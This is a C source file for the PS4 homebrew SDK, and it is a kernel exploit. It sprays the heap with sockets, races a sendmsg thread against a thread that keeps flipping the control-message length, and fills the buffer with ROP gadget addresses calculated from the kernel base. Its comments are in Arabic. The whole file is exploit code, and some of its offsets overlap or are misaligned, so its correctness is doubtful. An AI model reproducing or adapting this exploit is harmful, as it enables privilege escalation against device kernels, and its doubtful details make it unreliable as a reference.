#include <ps4.h>

#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_JMP_RSI_3B           0x049C5D 
#define OFF_POP_RBX_R14_RBP_JMP  0x345741 // pop rbx; pop r14; pop rbp; jmp [rsi+0x10]
#define OFF_RET                  0x0008E0

#define CONTROL_LEN 256
#define SPRAY_COUNT 256

uint8_t control_buf[CONTROL_LEN];
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };
struct msghdr { void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen; void *msg_control; uint32_t msg_controllen; int msg_flags; };

struct cmsghdr *cmsg;
int global_sock;
int spray_socks[SPRAY_COUNT];

void prepare_heap() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0);
        if(spray_socks[i] > 0) {
            uint8_t dummy[0x50];
            memset(dummy, 0, 0x50);
            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0);
        }
    }
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) { syscall(6, spray_socks[i]); spray_socks[i] = -1; }
    }
}

void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) { syscall(28, global_sock, &msg, 0); }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        for(volatile int i = 0; i < 200; i++) {
            cmsg->cmsg_len = 0x50;   
            cmsg->cmsg_len = 0xFFFF; 
        }
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel(); initLibc();
    uint64_t kbase = get_kernel_base();
    
    uint64_t step1 = kbase + OFF_PUSH_RSP_POP_RSI_RET; 
    uint64_t step2 = kbase + OFF_JMP_RSI_3B;           
    uint64_t step3 = kbase + OFF_POP_RBX_R14_RBP_JMP; 
    uint64_t val1 = 0xDEADC0DE; // لـ RBX
    uint64_t val2 = 0xBAADF00D; // لـ R14

    prepare_heap();

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_len = 0x50;

    // 1. ملء البفر بالخطوة الأولى (Trigger)
    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
        *(uint64_t *)(control_buf + i) = step1;
    }

    // 2. وضع القفزة لـ RSI+3B في مسار الـ Stack المتوقع
    for (int i = 0x50; i < 0xA0; i += 8) {
        *(uint64_t *)(control_buf + i) = step2;
    }

    // 3. وضع الجادجيت المركب عند الإزاحة 0x3b
    *(uint64_t *)(control_buf + 0x3b) = step3; 

    // 4. إغراق البفر بالقيم (RBX و R14 سيسحبان هذه القيم)
    // نضعها في مساحة واسعة لضمان السحب الصحيح
    for (int i = 0x10; i < 0x80; i += 16) {
        if (i == 0x3b) continue; // لا نمسح الجادجيت
        *(uint64_t *)(control_buf + i) = val1;
        *(uint64_t *)(control_buf + i + 8) = val2;
    }

    global_sock = syscall(97, 2, 2, 0);
    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");
    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);
    return 0;
}
